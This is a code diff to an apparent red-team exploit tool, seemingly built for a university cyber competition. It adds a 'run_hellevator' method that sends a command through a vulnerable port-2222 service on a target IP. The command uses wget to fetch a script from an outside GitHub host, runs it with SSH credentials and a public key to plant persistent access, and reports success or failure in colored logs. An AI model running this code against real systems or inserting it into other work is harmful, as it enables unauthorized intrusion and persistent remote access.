@@ -7,10 +7,7 @@ class ChallengeOnePython(Exploit):
 	def __init__(self, ip_address, parsed_config) -> None:
 		super().__init__(ip_address=ip_address, parsed_config=parsed_config)
 
-	def run_hellevator(self):
-		return super().run_hellevator()
-
-	def run_custom_command(self, command):
+	def run_command(self, command):
 		port = 2222
 		# logger.debug(f"{self.ip_address} - Connecting to port {port}...")
 		socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -43,6 +40,35 @@ class ChallengeOnePython(Exploit):
 		except IndexError:
 			raise PatchedException(f"{self.ip_address} - The target is patched")
 
+	def run_hellevator(self):
+		try:
+			logger.info(f"{self.ip_address} - Running Hellevator via ChallengeOnePython...")
+
+			username = self.parsed_config["ssh_username"]
+			password = self.parsed_config["ssh_password"]
+			ssh_key = self.parsed_config["ssh_public_key"]
+
+			download_hellevator_command = f"wget -O hellevator.sh https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/hellevator.sh && chmod +x hellevator.sh && ./hellevator.sh -u '{username}' -p '{password}' -s '{ssh_key}'"
+			server_response_text = self.run_command(command=download_hellevator_command)
+			# logger.debug(f"server_response_text is `{server_response_text}`")
+			if ssh_key in server_response_text:
+				logger.info(f"{BetterLogger.COLOR_BLUE}{self.ip_address} - Successfully executed Hellevator via ChallengeOnePython!{BetterLogger.COLOR_END}")
+				return True
+			logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via ChallengeOnePython!{BetterLogger.COLOR_END}")
+			return False
+		except IncorrectPatchException:
+			return None
+		except ConnectionRefusedError:
+			logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test ChallengeOnePython because the pvuln2_wrapper is not running!{BetterLogger.COLOR_END}")
+			return None
+		except PatchedException:
+			logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeOnePython.{BetterLogger.COLOR_END}")
+			return False
+		except Exception as err:
+			logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via ChallengeOnePython.{BetterLogger.COLOR_END}")
+			logger.exception(err)
+			return False
+
 	def test_if_vulnerable(self):
 		"""
 		Returns True if vulnerable and False if not
@@ -51,7 +77,7 @@ class ChallengeOnePython(Exploit):
 			logger.info(f"{self.ip_address} - Testing if the target is vulnerable to ChallengeOnePython...")
 			command = "whoami"
 			try:
-				self.run_custom_command(command=command)
+				self.run_command(command=command)
 				logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to ChallengeOnePython!{BetterLogger.COLOR_END}")
 				return True
 			except IncorrectPatchException:
